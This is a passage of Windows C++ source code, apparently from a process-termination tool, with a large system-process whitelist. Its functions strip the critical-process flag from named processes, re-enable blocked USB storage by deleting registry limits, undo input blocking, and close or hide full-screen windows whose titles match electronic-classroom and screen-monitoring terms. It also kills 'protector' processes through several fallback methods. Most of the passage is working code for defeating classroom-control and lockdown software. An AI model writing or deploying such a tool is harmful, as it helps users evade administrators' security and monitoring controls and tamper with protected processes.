    L"FileSyncHelper.exe",      // 文件同步助手
    L"FileCoAuth.exe",          // 文件协作认证
    L"OneDrive.exe",            // OneDrive 客户端
    L"ImgLocalVisionModelHelper64.exe", // 视觉模型助手
    L"WUDFHost.exe",            // 用户模式驱动框架
    
    // === 网络/连接 ===
    L"wlanext.exe",             // WLAN 扩展
    L"NetSetupSvc.exe",         // 网络设置服务
    L"WorkFolders.exe",         // 工作文件夹
    
    // === 安全软件 (赛门铁克) ===
    L"SECOCL64.exe",            // 赛门铁克
    L"SECOMN64.exe",            // 赛门铁克通信
    
    // === Intel 显卡/图形驱动 ===
    L"IntelCpHDCPSvc.exe",      // Intel HDCP 内容保护
    L"igfxCUIServiceN.exe",     // Intel 显卡控制面板服务
    L"igfxEMN.exe",             // Intel 显卡扩展
    L"igfxextN.exe",            // Intel 显卡外部
    L"IntelGraphicsSoftware.Service.exe", // Intel 显卡软件服务
    L"IntelGraphicsSoftware.exe",         // Intel 显卡软件
    L"OneApp.IGCC.WinService.exe",        // Intel 显卡命令中心服务
    L"DisplayControlService.exe",         // Intel 显示控制服务
    L"DisplayControl.exe",                // Intel 显示控制
    L"PresentMonService.exe",             // Intel PresentMon 服务
    
    // === Intel 其他服务 ===
    L"IntelAudioService.exe",   // Intel 音频服务
    L"RstMwService.exe",        // Intel 快速存储服务
    L"jhi_service.exe",         // Intel DAL 宿主接口
    L"SurSvc.exe",              // Intel SUR 服务
    L"TbtP2pShortcutService.exe", // Intel 雷电服务
    L"DSAService.exe",          // Intel 驱动支持助手
    L"DSAUpdateService.exe",    // Intel DSA 更新服务
    L"DSATray.exe",             // Intel DSA 托盘
    L"AppHelperCap.exe",        // Intel 能力许可助手
    L"DiagsCap.exe",            // Intel 诊断能力
    L"NetworkCap.exe",          // Intel 网络能力
    L"SysInfoCap.exe",          // Intel 系统信息能力
    L"esrv.exe",                // Intel 能源服务器
    L"esrv_svc.exe",            // Intel 能源服务器服务
    
    // === Realtek 音频 ===
    L"RtkAudUService64.exe",    // Realtek 音频服务
    L"cthelper.exe",            // Creative 音频驱动助手
    
    // === 触控板/指纹 ===
    L"SynTPEnhService.exe",     // Synaptics 触控板服务
    L"SynTPEnh.exe",            // Synaptics 触控板增强
    L"ELANFPService.exe",       // ELAN 指纹服务
    
    // === 输入法 ===
    L"ChsIME.exe",              // 微软中文输入法
    L"TabTip.exe",              // 触摸键盘
    
    // === 打印服务 ===
    L"spoolsv.exe",             // 打印后台处理
    
    // === 音频 ===
    L"audiodg.exe",             // 音频设备图形化
    L"MidiSrv.exe",             // MIDI 服务
    
    // === 浏览器 (用户可能正在使用) ===
    L"msedge.exe",              // Microsoft Edge
    L"msedgewebview2.exe",      // Edge WebView2 运行时
    L"identity_helper.exe",     // Edge 身份助手
    L"elevation_service.exe",   // Chrome 提权服务
    L"crashpad_handler.exe",    // Chromium 崩溃处理
    
    // === 虚拟化 ===
    L"vmtoolsd.exe",            // VMware Tools
    L"vmware-authd.exe",        // VMware 认证服务
    L"vmnetdhcp.exe",           // VMware 虚拟网络DHCP
    L"vmware-usbarbitrator64.exe", // VMware USB仲裁
    L"vmnat.exe",               // VMware NAT服务
    L"vmware-tray.exe",         // VMware 托盘
    
    // === 其他重要系统进程 ===
    L"rundll32.exe",            // DLL 执行宿主
    L"notepad.exe",             // 记事本 (防止误关)
    L"cmd.exe",                 // 命令提示符
    L"WindowsExplorer.exe",    // Explorer 别名
    
    // === 电源/事件/更新 ===
    L"UsoClient.exe",           // 更新会话编排客户端
    L"MoUsoCoreWorker.exe",     // Microsoft 更新核心工作进程
    L"usocoreworker.exe",       // 更新服务核心工作进程
    L"MusNotifyIcon.exe",       // Microsoft 更新通知图标
    L"TiWorker.exe",            // Trusted Installer 工作进程
    L"TrustedInstaller.exe",    // Trusted Installer 主进程
    L"sppsvc.exe",              // 软件保护平台服务
    
    // === 诊断/反馈 ===
    L"CompatTelRunner.exe",     // 兼容性遥测
    L"dwminit.exe",             // DWM 初始化
    
    // === GPU/图形 ===
    L"dxdiag.exe",              // DirectX 诊断(偶尔运行)
    
    // === 系统信息/任务 ===
    L"taskeng.exe",             // 任务引擎
    L"sdiagnhost.exe",          // 脚本诊断宿主
    
    // === 远程/桌面 ===
    L"rdpclip.exe",             // 远程桌面剪贴板
    L"rdpinput.exe",            // 远程桌面输入
    L"RdpShell.exe",            // 远程桌面Shell
    
    // === 字体/语言 ===
    L"LanguageComponentsInstaller.exe", // 语言组件安装器
    
    // === 应用模型 ===
    L"ApplicationFrameHost.exe", // UWP 应用框架宿主
    L"Calculator.exe",          // 计算器(UWP)
    L"SettingSyncHost.exe",     // 设置同步宿主
    L"SystemSettings.exe",      // 系统设置(UWP)
    L"StartMenuExperienceHost.exe", // 开始菜单体验宿主
    L"SearchApp.exe",           // 搜索应用(Cortana遗留)
    L"ShellExperienceHost.exe", // Shell 体验宿主
    
    // === Hyper-V/虚拟化 ===
    L"vmms.exe",                // 虚拟机管理服务
    L"vmcompute.exe",           // 虚拟机计算服务
    L"Vmmem.exe",               // 虚拟机内存进程
    L"vmwp.exe",                // 虚拟机工作进程
    
    // === 打印/传真 ===
    L"PrintDialog.exe",         // 打印对话框
    
    // === 系统恢复 ===
    L"RecoveryDrive.exe",       // 恢复驱动器
    L"VSSVC.exe"                // 卷影复制服务
};

// 白名单大小(用于快速迭代)
static const size_t g_WhitelistCount = sizeof(g_UnifiedSystemProcessWhitelist) / sizeof(g_UnifiedSystemProcessWhitelist[0]);

// 快速检查: 进程名是否在统一白名单中 (大小写不敏感)
static bool IsInUnifiedWhitelist(const std::wstring& processName) {
    std::wstring lowerName = processName;
    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
    
    for (size_t i = 0; i < g_WhitelistCount; i++) {
        std::wstring wname = g_UnifiedSystemProcessWhitelist[i];
        std::transform(wname.begin(), wname.end(), wname.begin(), ::towlower);
        if (lowerName == wname) {
            return true;
        }
    }
    return false;
}

// 兼容旧接口: ProcessTerminator 命名空间使用 (委托给统一白名单)

// 调用所有方法

void RemoveCriticalProcessFlags(const std::vector<std::string>& processNames)
{
    // 获取系统进程快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"无法创建进程快照" << std::endl;
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // 遍历所有进程
    if (Process32First(hSnapshot, &pe32))
    {
        do
        {
            // 将宽字符进程名转换为多字节字符串
            char processName[MAX_PATH];
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1,
                processName, MAX_PATH, NULL, NULL);

            // 检查是否在目标进程列表中
            for (const auto& targetName : processNames)
            {
                if (targetName == processName)
                {
                    // 找到匹配进程，尝试移除关键标识
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess != nullptr)
                    {
                        // 使用NtSetInformationProcess移除关键标识
                        typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
                            HANDLE ProcessHandle,
                            ULONG ProcessInformationClass,
                            PVOID ProcessInformation,
                            ULONG ProcessInformationLength);

                        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
                        if (hNtdll)
                        {
                            pNtSetInformationProcess NtSetInformationProcess =
                                reinterpret_cast<pNtSetInformationProcess>(
                                    GetProcAddress(hNtdll, "NtSetInformationProcess"));

                            if (NtSetInformationProcess)
                            {
                                DWORD breakOnTermination = 0;
                                NTSTATUS status = NtSetInformationProcess(
                                    hProcess,
                                    29, // ProcessBreakOnTermination
                                    &breakOnTermination,
                                    sizeof(breakOnTermination));

                                // 可选：记录操作结果
                                if (NT_SUCCESS(status))
                                {
                                    std::wcout << L"成功移除进程 " << pe32.szExeFile
                                        << L" (PID: " << pe32.th32ProcessID
                                        << L") 的关键标识" << std::endl;
                                }
                            }
                        }

                        CloseHandle(hProcess);
                    }
                    break; // 跳出内层循环，继续查找下一个进程
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
}
// 多进程终止方法

// 多进程终止方法

// 验证文件是否有微软数字签名

// USB存储恢复功能实现

bool ProcessTerminator::EnableUSBDevice(const std::wstring& deviceInstanceId) {
    GUID guid = GUID_DEVCLASS_USB;
    HDEVINFO hDevInfo = SetupDiGetClassDevsW(&guid, nullptr, nullptr, DIGCF_PRESENT);
    
    if (hDevInfo == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    SP_DEVINFO_DATA devInfoData = {};
    devInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
    
    bool foundDevice = false;
    
    for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &devInfoData); i++) {
        wchar_t instanceId[MAX_DEVICE_ID_LEN] = {};
        if (CM_Get_Device_IDW(devInfoData.DevInst, instanceId, MAX_DEVICE_ID_LEN, 0) != CR_SUCCESS) {
            continue;
        }
        
        // 检查是否为USB存储设备
        wchar_t compatibleIds[256] = {};
        DWORD buffersize = sizeof(compatibleIds);
        if (SetupDiGetDeviceRegistryPropertyW(hDevInfo, &devInfoData,
            SPDRP_COMPATIBLEIDS, nullptr, (PBYTE)compatibleIds, buffersize, nullptr)) {
            
            bool isStorage = wcsstr(compatibleIds, L"USBSTOR") != nullptr ||
                            wcsstr(compatibleIds, L"USB\\Class_08") != nullptr ||
                            wcsstr(compatibleIds, L"USB\\DevClass_08") != nullptr;
            
            if (isStorage) {
                // 获取设备状态
                DWORD status, problem;
                if (CM_Get_DevNode_Status(&status, &problem, devInfoData.DevInst, 0) == CR_SUCCESS) {
                    // 如果设备被禁用或有问题，尝试启用
                    if (problem == CM_PROB_DISABLED ||
                        (status & DN_DEVICE_DISABLED) ||
                        (status & DN_WILL_BE_REMOVED)) {
                        
                        // 启用设备 - 直接传入DEVINST值而不是指针
                        CONFIGRET cr = CM_Enable_DevNode(devInfoData.DevInst, 0);
                        if (cr == CR_SUCCESS) {
                            std::wcout << L"  [USB] 已启用设备: " << instanceId << std::endl;
                            foundDevice = true;
                        }
                    }
                }
            }
        }
    }
    
    SetupDiDestroyDeviceInfoList(hDevInfo);
    return foundDevice || true;
}

bool ProcessTerminator::ClearUSBRegistryLimits() {
    const wchar_t* keys[] = {
        L"SYSTEM\\CurrentControlSet\\Services\\USBSTOR",
        L"SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies",
        L"SYSTEM\\CurrentControlSet\\Control\\USB",
        L"SYSTEM\\CurrentControlSet\\Enum\\USB"
    };
    
    for (const wchar_t* keyPath : keys) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            // 尝试删除阻止USB的键值
            const wchar_t* values[] = { L"WriteProtect", L"EnableUsageCounting", L"DisableOnEject" };
            for (const wchar_t* valueName : values) {
                RegDeleteValueW(hKey, valueName);
            }
            
            // 如果Start值存在，设置为3（demand start）
            DWORD startValue = 3;
            RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&startValue, sizeof(startValue));
            
            RegCloseKey(hKey);
        }
    }
    
    return true;
}

bool ProcessTerminator::UnblockInput() {
    // 尝试解除输入阻塞
    // 注意：BlockInput(FALSE)只有在被阻塞时返回true，
    // 如果没有阻塞则返回false，这是正常行为，不需要输出消息
    BlockInput(FALSE);
    return true;
}

bool ProcessTerminator::UnhookGlobalInputHooks() {
    // 查找可能的钩子窗口并尝试卸载
    HWND shellTray = FindWindowW(L"Shell_TrayWnd", nullptr);
    if (shellTray) {
        DWORD pid;
        GetWindowThreadProcessId(shellTray, &pid);
    }
    
    // 枚举所有顶级窗口查找可疑钩子
    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
        wchar_t className[256] = {};
        wchar_t windowTitle[256] = {};
        
        GetClassNameW(hwnd, className, 256);
        GetWindowTextW(hwnd, windowTitle, 256);
        
        // 检测可疑类名或标题
        bool suspicious = wcsstr(className, L"Hook") != nullptr ||
                         wcsstr(className, L"Keyboard") != nullptr ||
                         wcsstr(className, L"Mouse") != nullptr ||
                         wcsstr(windowTitle, L"Monitor") != nullptr ||
                         wcsstr(windowTitle, L"Control") != nullptr;
        
        if (suspicious && IsWindowVisible(hwnd)) {
            // 尝试销毁可疑窗口
            DWORD pid;
            GetWindowThreadProcessId(hwnd, &pid);
            
            // 检查是否是其他进程的窗口
            if (pid != GetCurrentProcessId()) {
                // 尝试发送关闭消息
                PostMessageW(hwnd, WM_CLOSE, 0, 0);
            }
        }
        return TRUE;
    }, 0);
    
    return true;
}

// 全屏覆盖检测与对抗功能实现
bool ProcessTerminator::IsSuspiciousOverlayWindow(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd)) return false;
    if (!IsWindowVisible(hwnd)) return false;
    
    wchar_t className[256] = {};
    wchar_t windowTitle[256] = {};
    
    GetClassNameW(hwnd, className, 256);
    GetWindowTextW(hwnd, windowTitle, 256);
    
    LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
    
    RECT rect;
    if (!GetWindowRect(hwnd, &rect)) return false;
    
    int width = rect.right - rect.left;
    int height = rect.bottom - rect.top;
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    
    bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
    bool isPopup = (style & WS_POPUP) != 0;
    bool isFullscreen = (width >= screenW * 0.95f && height >= screenH * 0.95f);
    bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
    bool isToolWindow = (exStyle & WS_EX_TOOLWINDOW) != 0;
    
    bool suspiciousClass = wcsstr(className, L"DXGI") != nullptr ||
                         wcsstr(className, L"D3D") != nullptr ||
                         wcsstr(className, L"Overlay") != nullptr ||
                         wcsstr(className, L"Hook") != nullptr ||
                         wcsstr(className, L"Fullscreen") != nullptr ||
                         wcsstr(className, L"Screen") != nullptr ||
                         wcsstr(className, L"Monitor") != nullptr ||
                         wcsstr(className, L"ClassRoom") != nullptr ||
                         wcsstr(className, L"Education") != nullptr ||
                         wcsstr(className, L"Control") != nullptr;
    
    bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
                         wcsstr(windowTitle, L"监控") != nullptr ||
                         wcsstr(windowTitle, L"控制") != nullptr ||
                         wcsstr(windowTitle, L"屏幕") != nullptr ||
                         wcsstr(windowTitle, L"屏幕广播") != nullptr ||
                         wcsstr(windowTitle, L"学生机") != nullptr ||
                         wcsstr(windowTitle, L"教师端") != nullptr ||
                         wcsstr(windowTitle, L"电子教室") != nullptr;
    
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    bool isOwnProcess = (pid == GetCurrentProcessId());
    
    if (isOwnProcess) return false;
    if (isToolWindow && !isFullscreen) return false;
    
    if ((isTopmost && isFullscreen) || (suspiciousClass && isFullscreen) || 
        (isLayered && isFullscreen && suspiciousTitle) ||
        (isPopup && isFullscreen && suspiciousTitle) ||
        (isTopmost && isLayered && isFullscreen)) {
        return true;
    }
    
    return false;
}

bool ProcessTerminator::DetectDXGIOverlayWindows(std::vector<HWND>& overlayWindows) {
    overlayWindows.clear();
    
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        if (ProcessTerminator::IsSuspiciousOverlayWindow(hwnd)) {
            std::vector<HWND>* windows = reinterpret_cast<std::vector<HWND>*>(lParam);
            windows->push_back(hwnd);
        }
        return TRUE;
    }, reinterpret_cast<LPARAM>(&overlayWindows));
    
    return !overlayWindows.empty();
}

bool ProcessTerminator::DetectGDILayeredOverlay(std::vector<HWND>& overlayWindows) {
    overlayWindows.clear();
    
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        if (!IsWindowVisible(hwnd)) return TRUE;
        
        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
        
        if (!(exStyle & WS_EX_LAYERED)) return TRUE;
        
        RECT rect;
        if (!GetWindowRect(hwnd, &rect)) return TRUE;
        
        int width = rect.right - rect.left;
        int height = rect.bottom - rect.top;
        int screenW = GetSystemMetrics(SM_CXSCREEN);
        int screenH = GetSystemMetrics(SM_CYSCREEN);
        
        if (width >= screenW * 0.95f && height >= screenH * 0.95f) {
            wchar_t windowTitle[256] = {};
            GetWindowTextW(hwnd, windowTitle, 256);
            
            bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
                                 wcsstr(windowTitle, L"监控") != nullptr ||
                                 wcsstr(windowTitle, L"控制") != nullptr ||
                                 wcsstr(windowTitle, L"广播") != nullptr ||
                                 wcsstr(windowTitle, L"锁定") != nullptr ||
                                 wcsstr(windowTitle, L"全屏") != nullptr;
            
            if (suspiciousTitle) {
                std::vector<HWND>* windows = reinterpret_cast<std::vector<HWND>*>(lParam);
                windows->push_back(hwnd);
            }
        }
        
        return TRUE;
    }, reinterpret_cast<LPARAM>(&overlayWindows));
    
    return !overlayWindows.empty();
}

bool ProcessTerminator::RemoveFullscreenOverlay(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd)) return false;
    
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    
    if (pid == GetCurrentProcessId()) return false;
    
    PostMessageW(hwnd, WM_CLOSE, 0, 0);
    
    ShowWindow(hwnd, SW_HIDE);
    
    std::this_thread::sleep_for(std::chrono::milliseconds(10));
    
    if (IsWindow(hwnd)) {
        ShowWindow(hwnd, SW_MINIMIZE);
    }
    
    return true;
}

// 获取指定进程的可执行文件所在目录
std::wstring ProcessTerminator::GetProcessDirectory(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        return L"";
    }
    
    wchar_t path[MAX_PATH] = { 0 };
    DWORD size = MAX_PATH;
    std::wstring directory;
    
    if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
        std::wstring fullPath = path;
        size_t lastSlash = fullPath.find_last_of(L"\\/");
        if (lastSlash != std::wstring::npos) {
            directory = fullPath.substr(0, lastSlash);
        }
    }
    
    CloseHandle(hProcess);
    return directory;
}

// 获取当前进程的可执行文件所在目录
std::wstring ProcessTerminator::GetCurrentProcessDirectory() {
    wchar_t path[MAX_PATH] = { 0 };
    if (GetModuleFileNameW(NULL, path, MAX_PATH) == 0) {
        return L"";
    }
    
    std::wstring fullPath = path;
    size_t lastSlash = fullPath.find_last_of(L"\\/");
    if (lastSlash != std::wstring::npos) {
        return fullPath.substr(0, lastSlash);
    }
    return L"";
}

// 获取指定目录下的所有进程（不包括子目录）
std::vector<std::pair<DWORD, std::wstring>> ProcessTerminator::GetProcessesInSameDirectory(const std::wstring& targetDir) {
    std::vector<std::pair<DWORD, std::wstring>> processes;
    
    if (targetDir.empty()) return processes;
    
    // 标准化目标目录路径（转为小写用于比较）
    std::wstring normalizedTargetDir = targetDir;
    std::transform(normalizedTargetDir.begin(), normalizedTargetDir.end(), normalizedTargetDir.begin(), ::towlower);
    
    // 确保目录路径以反斜杠结尾，以便准确比较
    if (!normalizedTargetDir.empty() && normalizedTargetDir.back() != L'\\') {
        normalizedTargetDir += L'\\';
    }
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return processes;
    
    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // 跳过系统空闲进程和当前进程
            if (pe32.th32ProcessID == 0 || pe32.th32ProcessID == GetCurrentProcessId()) continue;
            
            // 获取进程的可执行文件路径
            HANDLE hProcess = OpenProcessEnhanced(pe32.th32ProcessID, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
            if (!hProcess) continue;
            
            wchar_t path[MAX_PATH] = { 0 };
            DWORD size = MAX_PATH;
            std::wstring processDir;
            
            if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
                std::wstring fullPath = path;
                size_t lastSlash = fullPath.find_last_of(L"\\/");
                if (lastSlash != std::wstring::npos) {
                    processDir = fullPath.substr(0, lastSlash);
                }
            }
            CloseHandle(hProcess);
            
            if (!processDir.empty()) {
                std::transform(processDir.begin(), processDir.end(), processDir.begin(), ::towlower);
                if (!processDir.empty() && processDir.back() != L'\\') {
                    processDir += L'\\';
                }
                
                if (processDir == normalizedTargetDir) {
                    processes.push_back(std::make_pair(pe32.th32ProcessID, std::wstring(pe32.szExeFile)));
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return processes;
}

// 结束同目录下的保护进程
bool ProcessTerminator::TerminateSameDirectoryProtectors(const std::wstring& targetProcessPath, bool useAllMethods) {
    // 获取目标进程所在目录
    size_t lastSlash = targetProcessPath.find_last_of(L"\\/");
    if (lastSlash == std::wstring::npos) return true;
    
    std::wstring targetDir = targetProcessPath.substr(0, lastSlash);
    std::wstring targetProcessName = targetProcessPath.substr(lastSlash + 1);
    
    // 获取同目录下的所有进程
    std::vector<std::pair<DWORD, std::wstring>> sameDirProcesses = GetProcessesInSameDirectory(targetDir);
    
    if (sameDirProcesses.empty()) return true;
    
    std::wcout << L"检测到同目录下有 " << sameDirProcesses.size() << L" 个进程，正在分析保护进程..." << std::endl;
    
    bool allTerminated = true;
    std::vector<std::wstring> processesToTerminate;
    
    for (const auto& proc : sameDirProcesses) {
        const std::wstring& processName = proc.second;
        
        // 跳过目标进程自身
        if (_wcsicmp(processName.c_str(), targetProcessName.c_str()) == 0) continue;
        
        // 检查是否在白名单中
        if (IsSystemProcessWhitelisted(processName)) {
            std::wstring processPath = targetDir + L"\\" + processName;
            if (IsMicrosoftSigned(processPath)) continue;
        }
        
        processesToTerminate.push_back(processName);
    }
    
    if (processesToTerminate.empty()) {
        std::wcout << L"没有需要终止的同目录保护进程" << std::endl;
        return true;
    }
    
    std::wcout << L"开始终止 " << processesToTerminate.size() << L" 个保护进程..." << std::endl;
    
    // 终止检测到的保护进程
    int successCount = 0;
    int failCount = 0;
    for (const auto& procName : processesToTerminate) {
        int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, procName.c_str(), -1, NULL, 0, NULL, NULL);
        std::string narrowName;
        if (sizeNeeded > 0) {
            narrowName.resize(sizeNeeded - 1);
            WideCharToMultiByte(CP_UTF8, 0, procName.c_str(), -1, &narrowName[0], sizeNeeded, NULL, NULL);
        }
        
        bool result = false;
        if (!result) result = terminateByProcessName(narrowName);
        if (!result) result = terminateBySystemCommand(narrowName);
        if (!result) result = terminateByParentChildRelationship(narrowName);
        if (!result) result = terminateByProcessIsolationAndBlocking(narrowName);
        if (!result) result = terminateByWindowHandle(narrowName);
        
        if (result) {
            std::wcout << L"  [成功] 已终止保护进程: " << procName << std::endl;
            successCount++;
        } else {
            std::wcout << L"  [失败] 无法终止保护进程: " << procName << std::endl;
            allTerminated = false;
            failCount++;
        }
    }
    
    return allTerminated;
}
